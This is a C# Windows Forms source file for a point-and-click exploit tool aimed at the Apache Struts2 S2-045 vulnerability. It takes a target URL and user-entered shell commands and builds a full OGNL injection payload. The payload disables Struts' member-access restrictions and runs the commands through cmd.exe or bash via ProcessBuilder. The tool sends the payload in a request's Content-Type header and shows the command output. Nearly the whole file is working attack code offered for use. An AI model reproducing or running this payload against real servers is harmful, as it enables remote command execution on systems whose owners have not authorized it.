using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;

namespace Struts2_045_Exp
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        private void btn_send_Click(object sender, EventArgs e)
        {
            //check url
            if (txt_url.Text == "")
            {
                txt_result.Text = "Are you kidding me?";
                txt_result.ForeColor = Color.Red;
                return;
            }

            //reset txt_result
            txt_result.Text = "";
            txt_result.ForeColor = Color.Black;

            //lock btn_send
            btn_send.Enabled = false;

            //try do
            try
            {
                //generate request
                HttpWebRequest request = HttpWebRequest.CreateHttp(@txt_url.Text);
                request.Timeout = 5000;
                request.ContentType = @txt_preview.Text;

                //get response
                HttpWebResponse response;
                try
                {
                    response = (HttpWebResponse)request.GetResponse();

                }
                catch (WebException ex) when (ex.Response != null)  //timeout refuse reset etc. but maybe 404
                {
                    response = (HttpWebResponse)ex.Response;  //404
                }

                //get result
                StreamReader reader = new StreamReader(response.GetResponseStream());
                string result = reader.ReadToEnd();

                //format CR LF
                if (rad_lf.Checked)
                {
                    result = result.Replace("\n", "\r\n");  //format LF(Unix) -> CRLF(Windows)
                }
                else if (rad_cr.Checked)
                {
                    result = result.Replace("\r", "\r\n");  //format CR(MAC) -> CRLF(Windows)
                }

                //display result
                txt_result.Text = result;
            }
            catch (Exception ex)
            {
                txt_result.Text = ex.ToString();
                txt_result.ForeColor = Color.Red;
                //throw;
            }
            finally
            {
                //unlock btn_send
                btn_send.Enabled = true;
            }
            
        }

        private void MainForm_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && e.KeyCode == Keys.Enter && btn_send.Enabled)
            {
                btn_send_Click(sender, e);
            }
        }

        private void txt_cmd_TextChanged(object sender, EventArgs e)
        {
            //remove empty line
            List<String> cmds = txt_cmd.Text.Split(new char[2] { '\r', '\n' }).ToList();
            cmds.RemoveAll((string cmd) => { return cmd.Replace(" ","") == ""; });

            if (cmds.Count == 0)
            {
                //PoC
                txt_preview.Text = @"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo vul').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
            }
            else
            {
                //generate payload
                string exp = "";
                foreach (string cmd in cmds)
                {
                    exp += cmd + " && ";
                }
                exp = exp.Remove(exp.Length - 4, 4);
                
                txt_preview.Text = @"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" +
                    exp + 
                    @"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
            }
        }

    }
}
